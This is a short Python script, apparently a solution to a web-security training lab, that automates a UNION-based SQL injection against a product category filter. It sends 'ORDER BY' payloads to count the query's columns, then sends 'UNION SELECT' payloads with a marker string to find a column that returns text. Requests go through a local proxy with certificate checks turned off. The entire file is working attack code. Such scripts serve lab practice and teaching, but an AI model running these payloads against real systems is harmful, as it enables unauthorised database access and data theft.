import requests
import sys
import  urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    uri = "/filter?category=Gifts"
    for i in range(1, 50):
        payload = "'+order+by+%s--" %i
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i+=1
    return False

def exploit_sqli_string_field(url, num_col):
    uri = "/filter?category=Gifts"
    for i in range(1, num_col+1):
        flag = "'ps0jkN'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = flag
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + uri + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if flag.strip('\'') in res:  # we strip the single quotes from the flag.
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + ".")
        print("[+] Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url, num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column) + ".")
        else:
            print("[-] Not able to find a column that has a string data type.")
    else:
        print("[-] The SQLi was not successful.")